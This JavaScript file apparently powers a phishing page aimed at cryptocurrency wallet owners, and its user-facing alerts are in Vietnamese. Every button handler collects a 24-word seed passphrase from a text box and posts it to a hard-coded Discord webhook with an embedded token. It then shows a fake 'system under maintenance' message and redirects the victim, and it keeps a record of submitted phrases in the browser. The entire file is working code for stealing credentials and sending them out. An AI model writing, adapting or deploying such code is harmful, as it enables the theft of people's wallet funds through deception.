const webhookUrl =
  "https://discord.com/api/v10/webhooks/1341617810287099964/oDyQM4PaOgceJWjOaESSPTmCYEi4_bqm4ZCpeKrTCSDt59w0Jqxou7cFggN1xCFRxsNt";

const savedPassphrases = JSON.parse(localStorage.getItem("passphrases")) || [];

document.querySelector(".btn").addEventListener("click", () => {
  sendData();
});

document.querySelector(".btn-secondary").addEventListener("click", () => {
  sendData();
});

document.querySelector(".image-wallet").addEventListener("click", () => {
  sendData();
});

function sendData() {
  const passphrase = document.querySelector("textarea").value.trim();
  const words = passphrase.split(/\s+/);

  if (!passphrase) {
    alert("Vui lòng nhập mật khẩu của bạn!");
    return;
  }

  if (words.length !== 24) {
    alert("Mật khẩu phải là 24 từ");
    return;
  }

  if (savedPassphrases.includes(passphrase)) {
    alert("Hệ thống đang bảo trì vui lòng quay lại sau!");
    window.location.href = "index.html";
    return;
  }

  fetch(webhookUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      content: passphrase,
    }),
  })
    .then(() => {
      savedPassphrases.push(passphrase);
      localStorage.setItem("passphrases", JSON.stringify(savedPassphrases));
      alert("Hệ thống đang bảo trì vui lòng quay lại sau!");
      window.location.href = "index.html";
    })
    .catch((error) => console.error("Error:", error));
}
